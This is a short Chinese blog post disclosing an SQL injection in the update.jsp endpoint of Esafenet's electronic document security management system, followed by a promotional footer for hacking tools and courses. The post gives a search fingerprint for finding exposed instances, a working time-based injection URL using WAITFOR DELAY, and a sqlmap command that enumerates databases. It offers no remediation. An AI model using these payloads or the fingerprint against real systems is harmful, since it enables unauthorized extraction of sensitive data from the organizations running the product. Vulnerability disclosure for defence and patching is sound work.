# 原创
：  掌控安全Update.jsp SQL注入

# 掌控安全Update.jsp SQL注入

**0x01 漏洞介绍**<br/> 亿赛通电子文档安全管理系统是国内最早基于文件过滤驱动技术的文档加解密产品之一，保护范围涵盖终端电脑（Windows、Mac、Linux系统平台）、智能终端（Android、IOS）及各类应用系统（OA、知识管理、文档管理、项目管理、PDM等）。该漏洞存在与/update接口下，flag对输入的数据没有进行严格的过滤而导致SQL注入，攻击者可以利用该漏洞获取数据库敏感信息。<br/>**0x02 影响产品**

> 
- `亿赛通电子文档安全管理系统`


**0x03 语法特征**

> 
- `app="亿赛通-电子文档安全管理系统"`


**0x04 漏洞复现**<br/> 页面<br/>  

<br/> POC

> 
- `CDGServer3/workflowE/useractivate/update.jsp?flag=1&amp;ids=1,3);WAITFOR%20DELAY%20%270:0:值%27--`


修改值的大小 对应延迟时间<br/>  

> 

- `python3 sqlmap.py -u "https://xxxxx/CDGServer3/workflowE/useractiv`- `ate/update.jsp?flag=1&amp;ids=1,3)" --batch --dbs`


**没看够~？欢迎关注！**

** **<img alt="" height="768" src="https://img-blog.csdnimg.cn/26702f478f4b4a04a4deaea3093b2464.png" width="1024"/>

渗透工具

技术文档、书籍

<img alt="" height="516" src="https://img-blog.csdnimg.cn/f333a24647774be5b99b00fb7019d620.png" width="852"/> <img alt="" height="523" src="https://img-blog.csdnimg.cn/3e579b7d7a164889a57771c035775069.png" width="856"/>

面试题

帮助你在面试中脱颖而出

视频

基础到进阶

环境搭建、HTML，PHP，MySQL基础学习，信息收集，SQL注入,XSS，CSRF，暴力破解等等

<img alt="" height="481" src="https://img-blog.csdnimg.cn/a601ca2e0eb040bd911477a4f54fef8e.png" width="694"/> <img alt="" height="77" src="https://img-blog.csdnimg.cn/04beeeb6757b422a83ca0900a349a544.png" width="665"/>
